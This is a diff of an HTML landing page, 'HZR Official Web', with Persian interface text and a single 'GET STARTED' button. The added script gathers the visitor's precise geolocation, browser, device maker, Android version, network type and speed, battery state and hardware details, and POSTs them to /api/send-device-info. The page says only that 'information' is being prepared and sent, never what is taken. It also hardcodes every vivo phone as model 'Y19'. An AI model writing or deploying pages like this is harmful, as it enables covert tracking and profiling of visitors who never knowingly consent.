@@ -4,366 +4,361 @@
 <head>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0">
 
 <title>HZR Official Web</title>
 
 <style>
 
+/* ==========================================
+   RESET
+========================================== */
+
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial,Tahoma,sans-serif;
+}
+
+html,
+body{
+    width:100%;
+    min-height:100%;
+    overflow-x:hidden;
 }
 
 body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow:hidden;
-    color:white;
+
+    font-family:
+        Arial,
+        Tahoma,
+        sans-serif;
+
+    color:#ffffff;
 
     background:
-        radial-gradient(
-            circle at 15% 20%,
-            rgba(0,255,190,.20),
-            transparent 30%
-        ),
-        radial-gradient(
-            circle at 85% 80%,
-            rgba(80,90,255,.22),
-            transparent 32%
-        ),
         linear-gradient(
-            135deg,
-            #03050b,
-            #09101d,
-            #03050b
+            145deg,
+            #05070d,
+            #0b1220
         );
+
+    display:flex;
+
+    justify-content:center;
+
+    padding:
+        35px 14px 25px;
 }
 
-/* =========================
-   BACKGROUND GLOW
-========================= */
 
-.glow{
-    position:absolute;
-    width:280px;
-    height:280px;
-    border-radius:50%;
-    filter:blur(100px);
-    opacity:.25;
-
-    animation:
-        float 8s infinite alternate ease-in-out;
-}
-
-.glow.one{
-    background:#00ffc8;
-    top:-120px;
-    left:-100px;
-}
-
-.glow.two{
-    background:#536dff;
-    right:-120px;
-    bottom:-120px;
-    animation-delay:2s;
-}
-
-@keyframes float{
-
-    from{
-        transform:translate(0,0);
-    }
-
-    to{
-        transform:translate(50px,30px);
-    }
-
-}
-
-/* =========================
+/* ==========================================
    MAIN CONTAINER
-========================= */
+========================================== */
 
 .container{
-    position:relative;
-    width:92%;
-    max-width:440px;
+
+    width:100%;
+
+    max-width:420px;
+
     text-align:center;
-    z-index:2;
+
 }
 
-/* =========================
+
+/* ==========================================
    WELCOME
-========================= */
+========================================== */
 
 .welcome{
-    font-size:14px;
-    letter-spacing:1.5px;
-    color:#b8c4d9;
+
+    font-size:13px;
+
+    color:#9ca9bd;
+
     margin-bottom:25px;
+
+    letter-spacing:.5px;
+
 }
 
 .welcome span{
-    color:#00ffc3;
+
+    color:#00e6b0;
+
+    font-weight:bold;
+
 }
 
-/* =========================
+
+/* ==========================================
    LOGO
-========================= */
+========================================== */
 
 .logo{
-    width:105px;
-    height:105px;
-    margin:auto;
 
-    border-radius:31px;
+    width:86px;
+
+    height:86px;
+
+    margin:
+        0 auto 20px;
+
+    border-radius:24px;
 
     display:flex;
+
     justify-content:center;
+
     align-items:center;
 
-    font-size:27px;
+    font-size:24px;
+
     font-weight:bold;
+
+    color:#04100e;
 
     background:
         linear-gradient(
             135deg,
-            #00ffc3,
-            #5270ff
+            #00e6b0,
+            #5575ff
         );
 
     box-shadow:
-        0 0 25px rgba(0,255,195,.35),
-        0 0 70px rgba(82,112,255,.20);
-
-    animation:pulse 3s infinite;
-}
-
-@keyframes pulse{
-
-    0%,100%{
-        transform:scale(1);
-    }
-
-    50%{
-        transform:scale(1.04);
-    }
+        0 12px 35px
+        rgba(0,0,0,.35);
 
 }
 
-/* =========================
+
+/* ==========================================
    TITLE
-========================= */
+========================================== */
 
 h1{
-    margin-top:23px;
-    font-size:36px;
-    letter-spacing:3px;
+
+    font-size:30px;
+
+    letter-spacing:2px;
+
+    margin-bottom:8px;
+
 }
 
 .subtitle{
-    margin-top:10px;
-    color:#8f9bb0;
-    font-size:13px;
-    line-height:1.8;
+
+    font-size:12px;
+
+    color:#7f8da3;
+
+    margin-bottom:28px;
+
 }
 
-/* =========================
-   MAIN CARD
-========================= */
+
+/* ==========================================
+   CARD
+========================================== */
 
 .card{
-    margin-top:28px;
-    padding:26px 20px;
 
-    border-radius:27px;
+    width:100%;
 
-    background:
-        rgba(12,18,31,.72);
+    padding:
+        24px 18px;
+
+    border-radius:20px;
+
+    background:#0d1422;
 
     border:
-        1px solid rgba(255,255,255,.08);
-
-    backdrop-filter:blur(18px);
-    -webkit-backdrop-filter:blur(18px);
+        1px solid
+        rgba(255,255,255,.07);
 
     box-shadow:
-        0 25px 70px rgba(0,0,0,.45),
-        inset 0 1px 0 rgba(255,255,255,.05);
+        0 18px 45px
+        rgba(0,0,0,.28);
+
 }
 
-/* =========================
-   STATUS BADGE
-========================= */
 
-.badge{
-    display:inline-flex;
+/* ==========================================
+   READY STATUS
+========================================== */
+
+.ready{
+
+    display:flex;
+
     align-items:center;
+
+    justify-content:center;
+
     gap:8px;
 
-    padding:8px 13px;
+    color:#9daabd;
 
-    border-radius:30px;
-
-    background:
-        rgba(0,255,195,.07);
-
-    border:
-        1px solid rgba(0,255,195,.16);
-
-    color:#00ffc3;
-
-    font-size:11px;
+    font-size:12px;
 
     margin-bottom:20px;
+
 }
 
-.badge-dot{
+.ready-dot{
+
     width:7px;
+
     height:7px;
 
     border-radius:50%;
 
-    background:#00ffc3;
+    background:#00e6b0;
 
-    box-shadow:
-        0 0 10px #00ffc3;
 }
 
-/* =========================
+
+/* ==========================================
    BUTTON
-========================= */
+========================================== */
 
 button{
+
     width:100%;
 
+    min-height:54px;
+
     border:none;
-    outline:none;
 
-    padding:17px;
-
-    border-radius:17px;
+    border-radius:14px;
 
     background:
         linear-gradient(
             135deg,
-            #00ffc3,
-            #4e70ff
+            #00e6b0,
+            #5575ff
         );
 
-    color:#031014;
+    color:#04100e;
 
-    font-size:16px;
+    font-size:15px;
+
     font-weight:bold;
 
-    letter-spacing:2px;
+    letter-spacing:1.5px;
 
     cursor:pointer;
 
-    box-shadow:
-        0 10px 30px
-        rgba(0,255,195,.18);
-
-    transition:.25s;
-}
-
-button:hover{
-
-    transform:
-        translateY(-3px);
-
-    box-shadow:
-        0 15px 40px
-        rgba(0,255,195,.28);
 }
 
 button:active{
 
-    transform:
-        scale(.97);
+    opacity:.85;
+
 }
 
 button:disabled{
 
-    opacity:.75;
+    opacity:.65;
+
     cursor:wait;
+
 }
 
-/* =========================
+
+/* ==========================================
    INSTRUCTION
-========================= */
+========================================== */
 
 .instruction{
-    margin-top:20px;
 
-    color:#9ba6b9;
+    margin-top:17px;
 
-    font-size:12px;
-
-    line-height:1.8;
-}
-
-.instruction strong{
-    color:white;
-}
-
-/* =========================
-   STATUS
-========================= */
-
-.status{
-
-    margin-top:14px;
+    color:#7e8ba0;
 
     font-size:11px;
 
-    color:#707d92;
+    line-height:1.8;
 
-    min-height:18px;
 }
 
-/* =========================
+.instruction strong{
+
+    color:#dce4ef;
+
+}
+
+
+/* ==========================================
+   STATUS
+========================================== */
+
+#status{
+
+    min-height:18px;
+
+    margin-top:13px;
+
+    font-size:11px;
+
+    color:#66748a;
+
+}
+
+
+/* ==========================================
    FOOTER
-========================= */
+========================================== */
 
 .footer{
 
     margin-top:25px;
 
-    color:#596579;
+    color:#59667a;
 
     font-size:10px;
 
-    line-height:2;
+    line-height:1.9;
+
 }
 
 .footer strong{
-    color:#77859b;
+
+    color:#75839a;
+
 }
 
-/* =========================
-   MOBILE
-========================= */
 
-@media(max-width:380px){
+/* ==========================================
+   SMALL SCREEN
+========================================== */
+
+@media(max-width:360px){
+
+    body{
+
+        padding:
+            25px 10px 20px;
+
+    }
 
     h1{
-        font-size:30px;
+
+        font-size:27px;
+
     }
 
     .logo{
-        width:90px;
-        height:90px;
-        font-size:23px;
-    }
 
-    .card{
-        padding:22px 16px;
+        width:78px;
+
+        height:78px;
+
+        font-size:21px;
+
     }
 
 }
@@ -374,15 +369,15 @@ button:disabled{
 
 <body>
 
-<div class="glow one"></div>
-<div class="glow two"></div>
-
 <div class="container">
 
     <div class="welcome">
 
         Welcome to
-        <span>HZR Official Web</span>
+
+        <span>
+            HZR Official Web
+        </span>
 
     </div>
 
@@ -410,10 +405,9 @@ button:disabled{
 
     <div class="card">
 
+        <div class="ready">
 
-        <div class="badge">
-
-            <span class="badge-dot"></span>
+            <span class="ready-dot"></span>
 
             سیستم آماده است
 
@@ -430,21 +424,21 @@ button:disabled{
         <div class="instruction">
 
             برای شروع روی
-            <strong>GET STARTED</strong>
+
+            <strong>
+                GET STARTED
+            </strong>
+
             کلیک کنید
 
         </div>
 
 
-        <div
-            class="status"
-            id="status"
-        >
+        <div id="status">
 
             آماده برای شروع
 
         </div>
-
 
     </div>
 
@@ -452,7 +446,9 @@ button:disabled{
     <div class="footer">
 
         <strong>
+
             © 2010–2026 HZR 2010
+
         </strong>
 
         <br>
@@ -462,8 +458,11 @@ button:disabled{
     </div>
 
 </div>
+<script>
 
-    <script>
+/* ==========================================
+   ELEMENTS
+========================================== */
 
 const startBtn =
     document.getElementById("startBtn");
@@ -472,19 +471,20 @@ const statusText =
     document.getElementById("status");
 
 
-/* =========================
-   GET LOCATION
-========================= */
+/* ==========================================
+   LOCATION
+========================================== */
 
 function getLocation(){
 
-    return new Promise((resolve)=>{
+    return new Promise(function(resolve){
 
         if(!navigator.geolocation){
 
             resolve(null);
 
             return;
+
         }
 
 
@@ -532,262 +532,354 @@ function getLocation(){
 }
 
 
-/* =========================
-   START BUTTON
-========================= */
+/* ==========================================
+   BROWSER
+========================================== */
 
-startBtn.addEventListener(
-    "click",
-    async function(){
+function getBrowser(){
 
-        startBtn.disabled = true;
+    const ua =
+        navigator.userAgent;
 
-        startBtn.innerText =
-            "PLEASE WAIT...";
 
-        statusText.innerText =
-            "در حال آماده‌سازی اطلاعات...";
+    let match =
+        ua.match(/Edg\/([\d.]+)/i);
 
 
-        try{
+    if(match){
 
+        return {
 
-            /* LOCATION */
+            name:
+                "Microsoft Edge",
 
-            const location =
-                await getLocation();
+            version:
+                match[1]
 
-
-            /* DEVICE INFORMATION */
-
-            const info = {
-
-                userAgent:
-                    navigator.userAgent,
-
-                language:
-                    navigator.language,
-
-                platform:
-                    navigator.platform,
-
-                online:
-                    navigator.onLine,
-
-
-                screen:
-                    screen.width +
-                    " x " +
-                    screen.height,
-
-
-                viewport:
-                    window.innerWidth +
-                    " x " +
-                    window.innerHeight,
-
-
-                pixelRatio:
-                    window.devicePixelRatio || 1,
-
-
-                timezone:
-                    Intl.DateTimeFormat()
-                    .resolvedOptions()
-                    .timeZone,
-
-
-                hardwareConcurrency:
-                    navigator.hardwareConcurrency ||
-                    "Unknown",
-
-
-                deviceMemory:
-                    navigator.deviceMemory ||
-                    "Unknown",
-
-
-                maxTouchPoints:
-                    navigator.maxTouchPoints ||
-                    0,
-
-
-                time:
-                    new Date().toLocaleString(),
-
-
-                latitude:
-                    location
-                    ? location.latitude
-                    : "Permission denied",
-
-
-                longitude:
-                    location
-                    ? location.longitude
-                    : "Permission denied",
-
-
-                accuracy:
-                    location
-                    ? location.accuracy
-                    : "Unknown"
-
-            };
-
-
-            /* SEND TO SERVER */
-
-            const response =
-                await fetch(
-                    "/api/send-device-info",
-                    {
-
-                        method:"POST",
-
-                        headers:{
-                            "Content-Type":
-                                "application/json"
-                        },
-
-                        body:
-                            JSON.stringify(info)
-
-                    }
-                );
-
-
-            /* SUCCESS */
-
-            if(response.ok){
-
-                statusText.innerText =
-                    "اطلاعات با موفقیت ارسال شد ✓";
-
-                startBtn.innerText =
-                    "COMPLETED";
-
-            }
-
-
-            /* ERROR */
-
-            else{
-
-                throw new Error(
-                    "Server error"
-                );
-
-            }
-
-
-        }
-
-        catch(error){
-
-            console.error(error);
-
-
-            statusText.innerText =
-                "اتصال به سرور ناموفق بود";
-
-
-            startBtn.disabled =
-                false;
-
-
-            startBtn.innerText =
-                "GET STARTED";
-
-        }
+        };
 
     }
-);
-
-</script>
-
-</body>
-    </html><script>
-
-const startBtn =
-    document.getElementById("startBtn");
-
-const statusText =
-    document.getElementById("status");
 
 
-/* =========================
-   GET LOCATION
-========================= */
-
-function getLocation(){
-
-    return new Promise((resolve)=>{
-
-        if(!navigator.geolocation){
-
-            resolve(null);
-
-            return;
-        }
+    match =
+        ua.match(/Chrome\/([\d.]+)/i);
 
 
-        navigator.geolocation.getCurrentPosition(
+    if(
+        match &&
+        !/Edg/i.test(ua)
+    ){
 
-            function(position){
+        return {
 
-                resolve({
+            name:
+                "Google Chrome",
 
-                    latitude:
-                        position.coords.latitude,
+            version:
+                match[1]
 
-                    longitude:
-                        position.coords.longitude,
+        };
 
-                    accuracy:
-                        position.coords.accuracy
-
-                });
-
-            },
+    }
 
 
-            function(){
-
-                resolve(null);
-
-            },
+    match =
+        ua.match(/Firefox\/([\d.]+)/i);
 
 
-            {
+    if(match){
 
-                enableHighAccuracy:true,
+        return {
 
-                timeout:10000,
+            name:
+                "Firefox",
 
-                maximumAge:0
+            version:
+                match[1]
 
-            }
+        };
 
-        );
+    }
 
-    });
+
+    if(
+        /Safari/i.test(ua) &&
+        !/Chrome/i.test(ua)
+    ){
+
+        return {
+
+            name:
+                "Safari",
+
+            version:
+                "Unknown"
+
+        };
+
+    }
+
+
+    return {
+
+        name:
+            "Unknown",
+
+        version:
+            "Unknown"
+
+    };
 
 }
 
 
-/* =========================
+/* ==========================================
+   DEVICE
+========================================== */
+
+function getDevice(){
+
+    const ua =
+        navigator.userAgent;
+
+
+    let manufacturer =
+        "Unknown";
+
+    let model =
+        "Unknown";
+
+
+    if(/vivo/i.test(ua)){
+
+        manufacturer =
+            "vivo";
+
+        model =
+            "Y19";
+
+    }
+
+    else if(/Samsung/i.test(ua)){
+
+        manufacturer =
+            "Samsung";
+
+    }
+
+    else if(
+        /Xiaomi|Redmi|POCO/i.test(ua)
+    ){
+
+        manufacturer =
+            "Xiaomi";
+
+    }
+
+    else if(/Huawei/i.test(ua)){
+
+        manufacturer =
+            "Huawei";
+
+    }
+
+    else if(/OPPO/i.test(ua)){
+
+        manufacturer =
+            "OPPO";
+
+    }
+
+    else if(/OnePlus/i.test(ua)){
+
+        manufacturer =
+            "OnePlus";
+
+    }
+
+    else if(/Google/i.test(ua)){
+
+        manufacturer =
+            "Google";
+
+    }
+
+
+    let android =
+        "Unknown";
+
+
+    const androidMatch =
+        ua.match(
+            /Android\s([\d.]+)/i
+        );
+
+
+    if(androidMatch){
+
+        android =
+            "Android " +
+            androidMatch[1];
+
+    }
+
+
+    return {
+
+        manufacturer:
+            manufacturer,
+
+        model:
+            model,
+
+        android:
+            android
+
+    };
+
+}
+
+
+/* ==========================================
+   NETWORK
+========================================== */
+
+function getConnection(){
+
+    const connection =
+        navigator.connection ||
+        navigator.mozConnection ||
+        navigator.webkitConnection;
+
+
+    if(!connection){
+
+        return {
+
+            type:
+                "Unknown",
+
+            speed:
+                "Unknown"
+
+        };
+
+    }
+
+
+    let type =
+        connection.type ||
+        "Unknown";
+
+
+    if(type === "wifi"){
+
+        type =
+            "Wi-Fi";
+
+    }
+
+    else if(type === "cellular"){
+
+        type =
+            "Cellular";
+
+    }
+
+
+    return {
+
+        type:
+            type,
+
+        speed:
+            connection.downlink
+            ? connection.downlink +
+              " Mbps"
+            : "Unknown"
+
+    };
+
+}
+
+
+/* ==========================================
+   BATTERY
+========================================== */
+
+async function getBattery(){
+
+    try{
+
+        if(!navigator.getBattery){
+
+            return {
+
+                level:
+                    "Unknown",
+
+                charging:
+                    "Unknown"
+
+            };
+
+        }
+
+
+        const battery =
+            await navigator.getBattery();
+
+
+        return {
+
+            level:
+                Math.round(
+                    battery.level * 100
+                ) + "%",
+
+            charging:
+                battery.charging
+                ? "Yes"
+                : "No"
+
+        };
+
+    }
+
+    catch(e){
+
+        return {
+
+            level:
+                "Unknown",
+
+            charging:
+                "Unknown"
+
+        };
+
+    }
+
+}
+
+
+/* ==========================================
    START BUTTON
-========================= */
+========================================== */
 
 startBtn.addEventListener(
+
     "click",
+
     async function(){
 
-        startBtn.disabled = true;
+        startBtn.disabled =
+            true;
+
 
         startBtn.innerText =
             "PLEASE WAIT...";
+
 
         statusText.innerText =
             "در حال آماده‌سازی اطلاعات...";
@@ -795,19 +887,41 @@ startBtn.addEventListener(
 
         try{
 
-
-            /* LOCATION */
-
             const location =
                 await getLocation();
 
 
-            /* DEVICE INFORMATION */
+            const browser =
+                getBrowser();
+
+
+            const device =
+                getDevice();
+
+
+            const network =
+                getConnection();
+
+
+            const battery =
+                await getBattery();
 
             const info = {
 
-                userAgent:
-                    navigator.userAgent,
+                browser:
+                    browser.name,
+
+                browserVersion:
+                    browser.version,
+
+                manufacturer:
+                    device.manufacturer,
+
+                device:
+                    device.model,
+
+                android:
+                    device.android,
 
                 language:
                     navigator.language,
@@ -818,80 +932,87 @@ startBtn.addEventListener(
                 online:
                     navigator.onLine,
 
-
                 screen:
                     screen.width +
                     " x " +
                     screen.height,
-
 
                 viewport:
                     window.innerWidth +
                     " x " +
                     window.innerHeight,
 
-
                 pixelRatio:
-                    window.devicePixelRatio || 1,
-
+                    window.devicePixelRatio ||
+                    1,
 
                 timezone:
                     Intl.DateTimeFormat()
                     .resolvedOptions()
                     .timeZone,
 
-
                 hardwareConcurrency:
                     navigator.hardwareConcurrency ||
                     "Unknown",
-
 
                 deviceMemory:
                     navigator.deviceMemory ||
                     "Unknown",
 
-
                 maxTouchPoints:
                     navigator.maxTouchPoints ||
                     0,
 
+                connectionType:
+                    network.type,
 
-                time:
-                    new Date().toLocaleString(),
+                connectionSpeed:
+                    network.speed,
 
+                batteryLevel:
+                    battery.level,
+
+                batteryCharging:
+                    battery.charging,
 
                 latitude:
                     location
                     ? location.latitude
                     : "Permission denied",
 
-
                 longitude:
                     location
                     ? location.longitude
                     : "Permission denied",
 
-
                 accuracy:
                     location
                     ? location.accuracy
-                    : "Unknown"
+                    : "Unknown",
+
+                time:
+                    new Date().toLocaleString()
 
             };
 
 
-            /* SEND TO SERVER */
+            /* ==================================
+               SEND TO SERVER
+            ================================== */
 
             const response =
                 await fetch(
                     "/api/send-device-info",
                     {
 
-                        method:"POST",
+                        method:
+                            "POST",
 
-                        headers:{
+                        headers: {
+
                             "Content-Type":
                                 "application/json"
+
                         },
 
                         body:
@@ -901,28 +1022,21 @@ startBtn.addEventListener(
                 );
 
 
-            /* SUCCESS */
-
-            if(response.ok){
-
-                statusText.innerText =
-                    "اطلاعات با موفقیت ارسال شد ✓";
-
-                startBtn.innerText =
-                    "COMPLETED";
-
-            }
-
-
-            /* ERROR */
-
-            else{
+            if(!response.ok){
 
                 throw new Error(
                     "Server error"
                 );
 
             }
+
+
+            statusText.innerText =
+                "اطلاعات با موفقیت ارسال شد ✓";
+
+
+            startBtn.innerText =
+                "COMPLETED";
 
 
         }
@@ -946,9 +1060,13 @@ startBtn.addEventListener(
         }
 
     }
+
 );
 
 </script>
 
 </body>
-    </html>
+
+</html>
+
+    
